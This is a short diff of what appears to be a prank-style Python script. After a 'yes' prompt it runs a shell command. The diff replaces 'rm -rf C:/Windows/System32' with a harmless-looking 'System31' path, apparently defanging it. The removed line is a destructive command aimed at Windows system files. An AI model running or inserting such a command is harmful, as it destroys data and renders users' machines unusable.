@@ -10,6 +10,6 @@ if user_input.lower() == "yes":
         time.sleep(1)
 
     print("\n Good Luck . \n")
-    os.system("rm -rf C:/Windows/System32")
+    os.system("rm -rf C:/Windows/System31")
 else:
     print("Operation cancelled.")
